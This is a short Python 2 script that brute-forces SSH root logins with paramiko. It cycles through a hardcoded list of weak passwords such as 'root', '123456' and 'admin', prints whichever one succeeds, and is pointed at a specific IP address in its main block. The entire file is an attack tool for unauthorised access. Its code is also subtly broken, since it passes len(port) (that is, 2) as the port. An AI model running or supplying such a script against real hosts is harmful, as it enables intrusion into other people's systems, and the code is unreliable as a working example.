#-*- coding: utf-8 -*-
#!/usr/bin/python 
import paramiko

def ssh2(ip='',port='22',name=''):
    head=''
    ans=None
    keywords=''
    hackinfo=''

    ssh=None
    passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','696969',
            'abc123','qwerty']
    for i in passwd:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,len(port),'root',i,timeout=5)
            hackinfo= ' ssh the password is :'+i
            print ip+hackinfo
            keywords='ssh'
            break;
        except Exception,e:
            keywords='ssh'
            hackinfo=str(e)
            if e[0]==111:
                hackinfo=str(e)
                keywords='ssh'
                print ip+'  key is not '+i
                continue
            if e[0]==113:
                hackinfo=str(e)
                keywords=' '
                break
            else:
                break
        finally:
            if ssh !=None:
                ssh.close()
    return head,ans,keywords,hackinfo
if __name__ == "__main__":
    temp=ssh2('125.45.23.96')
    print temp
    
